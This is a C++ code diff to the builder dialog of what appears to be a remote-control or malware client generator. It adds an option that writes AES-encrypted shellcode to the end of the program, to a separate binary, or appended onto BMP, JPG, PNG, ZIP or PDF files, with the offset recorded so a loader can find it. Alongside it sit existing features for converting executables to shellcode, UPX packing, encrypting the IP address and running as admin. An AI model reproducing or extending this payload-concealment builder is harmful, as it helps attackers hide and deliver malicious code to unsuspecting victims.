@@ -23,6 +23,16 @@ enum Index {
     OTHER_ITEM
 };
 
+enum Payload {
+    Payload_Self,
+    Payload_Raw,
+    Payload_BMP,
+    Payload_JPG,
+    Payload_PNG,
+    Payload_ZIP,
+    Payload_PDF,
+};
+
 // CBuildDlg 对话框
 
 IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
@@ -91,6 +101,8 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
     DDX_Control(pDX, IDC_EDIT_GROUPNAME, m_EditGroup);
     DDX_Text(pDX, IDC_EDIT_GROUPNAME, m_sGroupName);
     DDV_MaxChars(pDX, m_sGroupName, 23);
+    DDX_Control(pDX, IDC_COMBO_PAYLOAD, m_ComboPayload);
+    DDX_Control(pDX, IDC_STATIC_PAYLOAD, m_StaticPayload);
 }
 
 
@@ -101,6 +113,7 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_COMMAND(ID_HELP_FINDDEN, &CBuildDlg::OnHelpFindden)
     ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
     ON_COMMAND(ID_CLIENT_RUNAS_ADMIN, &CBuildDlg::OnClientRunasAdmin)
+    ON_CBN_SELCHANGE(IDC_COMBO_COMPRESS, &CBuildDlg::OnCbnSelchangeComboCompress)
 END_MESSAGE_MAP()
 
 
@@ -112,7 +125,7 @@ void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, b
 bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer,
                    int ulOriginalLength, bool align = false);
 
-BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size);
+BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size, LONGLONG offset = 0);
 
 std::string ReleaseEXE(int resID, const char* name)
 {
@@ -134,8 +147,10 @@ std::string ReleaseEXE(int resID, const char* name)
 typedef struct SCInfo {
     unsigned char aes_key[16];
     unsigned char aes_iv[16];
-    unsigned char data[4 * 1024 * 1024];
+    unsigned char *data;
     int len;
+    int offset;
+    char file[_MAX_PATH];
 } SCInfo;
 
 #define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)
@@ -161,6 +176,21 @@ void generate_random_iv(unsigned char* iv, size_t len)
     MYLoadLibrary(crypt);
     BCryptGenRandomF BCryptGenRandom = (BCryptGenRandomF)GetAddr(crypt, name);
     BCryptGenRandom(NULL, iv, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+}
+
+ULONGLONG GetFileSize(const char* path)
+{
+	std::ifstream file(path, std::ios::binary | std::ios::ate);
+
+	if (!file) {
+		Mprintf("Failed to open file: %s.\n", path);
+		return 0;
+	}
+
+	ULONGLONG size = file.tellg();
+	file.close();
+
+	return size;
 }
 
 void CBuildDlg::OnBnClickedOk()
@@ -336,14 +366,33 @@ void CBuildDlg::OnBnClickedOk()
                             struct AES_ctx ctx;
                             AES_init_ctx_iv(&ctx, sc->aes_key, sc->aes_iv);
                             AES_CBC_encrypt_buffer(&ctx, srcData, srcLen);
-                            if (srcLen <= 4 * 1024 * 1024) {
-                                memcpy(sc->data, srcData, srcLen);
-                                sc->len = srcLen;
-                            }
-                            SAFE_DELETE_ARRAY(srcData);
+                            sc->len = srcLen;
+                            sc->offset = dwSize;
+                            CString old = strSeverFile;
                             PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
                             strSeverFile.ReleaseBuffer();
+                            if (strSeverFile != old) DeleteFileA(old);
+							int n = m_ComboPayload.GetCurSel();
+							CString payload = strSeverFile;
+							if (n) {
+								static std::map<int, std::string> m = {
+									{ Payload_Raw, "*.bin|*.bin|"}, { Payload_BMP, "*.bmp|*.bmp|"},
+									{ Payload_JPG, "*.jpg|*.jpg|"}, { Payload_PNG, "*.png|*.png|"},
+									{ Payload_ZIP, "*.zip|*.zip|"}, { Payload_PDF, "*.pdf|*.pdf|"},
+								};
+								payload = GetFilePath(NULL, m[n].c_str(), n != Payload_Raw);
+								sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
+                                strcpy(sc->file, PathFindFileNameA(payload));
+								tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
+							}
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
+                            if (r) {                               
+								r = WriteBinaryToFile(payload.GetString(), (char*)srcData, srcLen, n == Payload_Raw ? 0 : -1);
+								if (!r) tip = "\r\n警告: 生成载荷失败!";
+                            }else{
+                                MessageBox("文件生成失败: \r\n" + strSeverFile, "提示", MB_ICONINFORMATION);
+                            }
+                            SAFE_DELETE_ARRAY(srcData);
                         }
                     }
                 }
@@ -420,6 +469,17 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
     m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
 
+    m_ComboPayload.InsertString(Payload_Self, "载荷写入当前程序尾部");
+    m_ComboPayload.InsertString(Payload_Raw, "载荷写入单独的二进制文件");
+    m_ComboPayload.InsertString(Payload_BMP, "载荷写入 BMP 格式图片");
+    m_ComboPayload.InsertString(Payload_JPG, "载荷写入 JPG 格式图片");
+    m_ComboPayload.InsertString(Payload_PNG, "载荷写入 PNG 格式图片");
+    m_ComboPayload.InsertString(Payload_ZIP, "载荷写入 ZIP 压缩包");
+    m_ComboPayload.InsertString(Payload_PDF, "载荷写入 PDF 文件");
+    m_ComboPayload.SetCurSel(Payload_Self);
+    m_ComboPayload.ShowWindow(SW_HIDE);
+    m_StaticPayload.ShowWindow(SW_HIDE);
+
     m_OtherItem.ShowWindow(SW_HIDE);
 
     m_runasAdmin = FALSE;
@@ -434,29 +494,36 @@ BOOL CBuildDlg::OnInitDialog()
     // 异常: OCX 属性页应返回 FALSE
 }
 
+CString CBuildDlg::GetFilePath(CString type, CString filter, BOOL isOpen) {
+	CComPtr<IShellFolder> spDesktop;
+	HRESULT hr = SHGetDesktopFolder(&spDesktop);
+	if (FAILED(hr)) {
+		MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
+		return "";
+	}
+	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
+	CFileDialog fileDlg(isOpen, type, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, filter, AfxGetMainWnd());
+	int ret = 0;
+	try {
+		ret = fileDlg.DoModal();
+	}
+	catch (...) {
+		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
+		return "";
+	}
+    if (ret == IDOK) {
+        CString name = fileDlg.GetPathName();
+        return name;
+    }
+    return "";
+}
+
 void CBuildDlg::OnCbnSelchangeComboExe()
 {
     auto n = m_ComboExe.GetCurSel();
     if (n == OTHER_ITEM) {
-        CComPtr<IShellFolder> spDesktop;
-        HRESULT hr = SHGetDesktopFolder(&spDesktop);
-        if (FAILED(hr)) {
-            MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
-            return;
-        }
-        // 过滤器：显示所有文件和特定类型文件（例如文本文件）
-        CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
-                            _T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), AfxGetMainWnd());
-        int ret = 0;
-        try {
-            ret = fileDlg.DoModal();
-        } catch (...) {
-            MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
-            return;
-        }
-        if (ret == IDOK) {
-            CString name = fileDlg.GetPathName();
-
+        CString name = GetFilePath(_T("dll"), _T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"));
+        if (!name.IsEmpty()) {
             m_OtherItem.SetWindowTextA(name);
             CFile File;
             BOOL ret = File.Open(name, CFile::modeRead | CFile::typeBinary);
@@ -512,4 +579,11 @@ void CBuildDlg::OnClientRunasAdmin()
     m_runasAdmin = !m_runasAdmin;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
     SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, m_runasAdmin ? MF_CHECKED : MF_UNCHECKED);
+}
+
+
+void CBuildDlg::OnCbnSelchangeComboCompress()
+{
+    m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
+	m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
 }
